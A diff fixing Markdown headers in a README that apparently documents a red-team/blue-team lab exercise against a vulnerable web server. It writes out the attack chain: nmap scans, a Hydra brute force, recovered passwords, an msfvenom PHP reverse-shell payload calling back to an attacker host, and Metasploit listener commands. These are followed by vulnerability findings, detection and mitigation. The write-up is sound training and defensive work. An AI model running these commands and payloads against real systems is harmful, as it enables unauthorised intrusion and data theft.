@@ -1,11 +1,11 @@
 # Red Team vs Blue Team Analysis
 Assessment, Analysis, and Hardening of a Vulnerable System
 
-##Network Topology
+## Network Topology
 ------
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED%20VS%20BLUE%20NETWORK.png)
 
-##Red Team Penetration Test
+## Red Team Penetration Test
 ------
 Network scan to discover target IP
 'netdiscover -r 192.168.1.0/24'
@@ -17,7 +17,7 @@ Network scan to discover target IP
 | Capstone (Target)     | 192.168.1.105 |
 | ELK Server            | 192.168.1.100 |
 
-##Simple scan for open ports
+## Simple scan for open ports
 'nmap 192.168.1.105'
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/6.PNG)
 
@@ -26,12 +26,12 @@ Network scan to discover target IP
 | 22        | ssh      |
 | 80        | http     |
 
-##Agressive scan for more information
+## Agressive scan for more information
 'nmap -vvv 192.168.1.105'
 Output shows a webserver directory with interesting files listed such as *ashton* and *hannah* text files.
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/22.png)
 
-##Webserver Navigation
+## Webserver Navigation
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/7.PNG)
 
 I then find a text file that lists some new employees and their positions. One person in particuler is Ryan, the new CEO, he may have the highest level access.
@@ -40,12 +40,12 @@ I then find a text file that lists some new employees and their positions. One p
 Further investigation through the folders leads to a text file within the *company_folders/company_culture* path. This also mentions an interesting hidden folder I did not see earlier, titled *secret_folder*.
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/24.png)
 
-##Directory Traversal
+## Directory Traversal
 Using the new found knowledge of the existance of the *secret_folder*, I use directory traversal in the webserver URL to gain access. A login screen displays stating *For ashtons eyes only*. Knowing now the user name that has access, I must bruteforce attack to gain access.
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/8.PNG)
 
-##Vulnerability Scanning
+## Vulnerability Scanning
 Before launching any attacks, I wanted to perform a vulnerability scan to identify any known vulnerabilities.
 'nmap -A --script=vuln -vvv 192.168.1.105'
 
@@ -57,7 +57,7 @@ Before launching any attacks, I wanted to perform a vulnerability scan to identi
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/26.png)
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/27.png)
 
-##Launching Brute Force Attack
+## Launching Brute Force Attack
 We know that Ashton has access to the *secret_folder*, as stated when attempting to login. So I utilized the Hydra tool to launch the attack with the commonly used passwords list.
 'hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder'
 
@@ -65,14 +65,14 @@ We know that Ashton has access to the *secret_folder*, as stated when attempting
 
 Password has been found to be *leopoldo*
 
-##SSH into webserver using Ashton's login info
+## SSH into webserver using Ashton's login info
 'ssh ashton@192.168.1.105'
  Once logged in I notice something sitting in the *home* directory.
  
-###Flag1
+### Flag1
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/28.png)
  
-##Password Hash Found
+## Password Hash Found
 Once I gain access, I click on the file *connect_to_corp_server* to look at the contents. The file contains the step-by-step instructions to connect to server and Ryan's password *hash*.
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/11.PNG)
@@ -83,11 +83,11 @@ Password is *linux4u*
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/13.PNG)
 
-##Logging into WebDav with Ryan's credentials.
+## Logging into WebDav with Ryan's credentials.
 Once I gained access, I notice another file of interest called *passwd.dav*.
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/29.png)
 
-##Creating a Reverse Shell
+## Creating a Reverse Shell
 In order to create a reverse shell, I utilized msfvenom to create a payload php file containing a shell script.
 'msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php'
 
@@ -97,7 +97,7 @@ I then dragged and dropped the shell.php file into the *network:///dav://192.168
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/14.PNG)
 
-##Setting up a listener using Metasploit
+## Setting up a listener using Metasploit
 'msfconsole'
 'use multi/handler'
 
@@ -111,19 +111,19 @@ I switch back to Metasploit to confirm connection and that a Meterpreter session
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/19.PNG)
 
-##Creating Interactive Shell
+## Creating Interactive Shell
 'python -c 'import pty; pty.spawn("/bin/bash")'
 
-###Flag2
+### Flag2
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/20.PNG)
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/21.PNG)
 
-##Exfiltration
+## Exfiltration
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/30.png)
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/31.png)
 
-##Vulnerabilities
-###Webservers
+## Vulnerabilities
+### Webservers
 1. Directory listing vulnerability. Webserver directories are open to the public and navigable in a browser.
 CWE-548: Exposure of Information Through Directory Listing
 
@@ -161,7 +161,7 @@ CWE-311: Missing Encryption of Sensitive Data
 https://cwe.mitre.org/data/definitions/311.html
 
 7. CWE-522: Insufficiently Protected Credentials
-###Users and Passwords
+### Users and Passwords
 1. Usernames are employee first names.
   * These are too obvious and most likely discoverable through Google Dorking. All are high level employees of the company which are more vulnerable, and certainly easier to find in the company structure in publicly available material.
 
@@ -195,7 +195,7 @@ https://cwe.mitre.org/data/definitions/521.html
   * *linux4u* is a simple phrase with very common word substitution – 4=for, u=you. and leopoldo is a common name that could easily be bruteforced with a common password list.
   * Require strong passwords that exclude phrases and names, minimum 8 characters, mixed characters that include a combination of lower case, upper case, special characters and numbers.
   * Consider implementing multi-factor authentication.
-###Apache 2.4.29
+### Apache 2.4.29
 1. CVE-2017-15710
   * This potential Apache httpd vulnerability was picked up by nmap and relates to a configuration that verifies user credentials; a particular header value is searched for and if it is not present in the charset conversion table, it reverts to a fallback of 2 characters (eg. en-US becomes en). While this risk is unlikely, if there is a header value of less than 2 characters, the system may crash.
 
@@ -219,21 +219,21 @@ https://cwe.mitre.org/data/definitions/521.html
   
 ------
 
-#Blue Team
+# Blue Team
 ------
 
-##Identifying the port scan
+## Identifying the port scan
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/Connections%20Overtime.PNG)
 
-##Requests for the *secret_folder* and the amount of time the reverse shell was used.
+## Requests for the *secret_folder* and the amount of time the reverse shell was used.
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/TOP%2010%20HTTP.PNG)
 
-##Filtering for Brute Force Attacks
+## Filtering for Brute Force Attacks
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/BRUTE%20FORCE%20CONFIRMED.PNG)
 
 ------
 
-##Recommended Alarms and Mitigation Strategies
+## Recommended Alarms and Mitigation Strategies
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit1.PNG)
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/BLUE/mit2.PNG)
